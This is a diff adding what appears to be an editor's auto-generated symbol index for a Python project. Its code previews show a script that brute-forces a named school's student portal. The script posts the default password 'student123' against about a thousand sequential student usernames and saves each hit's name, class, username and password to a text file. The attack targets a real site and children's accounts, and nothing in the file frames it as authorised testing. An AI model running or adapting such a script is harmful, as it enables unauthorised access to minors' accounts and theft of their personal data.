@@ -1,0 +1,81 @@
+[
+    {
+        "label": "BeautifulSoup",
+        "importPath": "bs4",
+        "description": "bs4",
+        "isExtraImport": true,
+        "detail": "bs4",
+        "documentation": {}
+    },
+    {
+        "label": "json",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "json",
+        "description": "json",
+        "detail": "json",
+        "documentation": {}
+    },
+    {
+        "label": "requests",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "requests",
+        "description": "requests",
+        "detail": "requests",
+        "documentation": {}
+    },
+    {
+        "label": "Student",
+        "importPath": "student",
+        "description": "student",
+        "isExtraImport": true,
+        "detail": "student",
+        "documentation": {}
+    },
+    {
+        "label": "tryWithPwd",
+        "kind": 2,
+        "importPath": "getCredentials",
+        "description": "getCredentials",
+        "peekOfCode": "def tryWithPwd(username, pwd):\n    payload = {'username': username,\n               'password': pwd}\n    # Post the payload to the site to log in\n    for i in range(1, 1000):  # max 1000 children/class\n        username += 1\n        payload['username'] = username\n        # payload['password'] = username\n        response = session.post(\n            \"https://dpsharidwar.edunexttech.com/SignUp\", data=payload)",
+        "detail": "getCredentials",
+        "documentation": {}
+    },
+    {
+        "label": "saveUsernames",
+        "kind": 2,
+        "importPath": "getCredentials",
+        "description": "getCredentials",
+        "peekOfCode": "def saveUsernames():\n    with open('usernames.txt', 'w') as f:\n        for s in successFullLogins:\n            strS = f'Name: {s.name}\\nClass: {s.classAndSection}\\nUsername: {s.username}\\nPassword: {s.password}\\n\\n'\n            f.write(strS)\nif __name__ == '__main__':\n    print(\"Bruteforcing username...\")\n    tryWithPwd(20100000, 'student123')\n    print(\"Successfully found\", len(successFullLogins), \"usernames\")\n    saveUsernames()",
+        "detail": "getCredentials",
+        "documentation": {}
+    },
+    {
+        "label": "session",
+        "kind": 5,
+        "importPath": "getCredentials",
+        "description": "getCredentials",
+        "peekOfCode": "session = requests.Session()\n# Create the payload\nsuccessFullLogins = []\ndef tryWithPwd(username, pwd):\n    payload = {'username': username,\n               'password': pwd}\n    # Post the payload to the site to log in\n    for i in range(1, 1000):  # max 1000 children/class\n        username += 1\n        payload['username'] = username",
+        "detail": "getCredentials",
+        "documentation": {}
+    },
+    {
+        "label": "successFullLogins",
+        "kind": 5,
+        "importPath": "getCredentials",
+        "description": "getCredentials",
+        "peekOfCode": "successFullLogins = []\ndef tryWithPwd(username, pwd):\n    payload = {'username': username,\n               'password': pwd}\n    # Post the payload to the site to log in\n    for i in range(1, 1000):  # max 1000 children/class\n        username += 1\n        payload['username'] = username\n        # payload['password'] = username\n        response = session.post(",
+        "detail": "getCredentials",
+        "documentation": {}
+    },
+    {
+        "label": "Student",
+        "kind": 6,
+        "importPath": "student",
+        "description": "student",
+        "peekOfCode": "class Student:\n    def __init__(self, name, classAndSection, username, password):\n        self.name = name\n        self.classAndSection = classAndSection\n        self.username = username\n        self.password = password",
+        "detail": "student",
+        "documentation": {}
+    }
+]
